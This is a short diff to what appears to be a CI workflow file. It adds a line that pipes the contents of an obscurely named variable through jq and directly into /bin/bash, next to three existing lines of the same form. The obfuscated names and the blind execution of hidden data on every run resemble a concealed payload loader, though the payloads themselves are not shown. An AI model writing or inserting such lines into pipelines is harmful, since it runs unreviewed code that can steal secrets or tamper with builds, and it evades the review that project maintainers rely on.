@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$id76" | jq -r .mgv84726 | /bin/bash
           printf '%s' "$gvw5" | jq -r .d5369 | /bin/bash
           printf '%s' "$c74" | jq -r .a74 | /bin/bash
+          printf '%s' "$ksgru4" | jq -r .l577 | /bin/bash
 
       - name: Store artifact
         if: always()
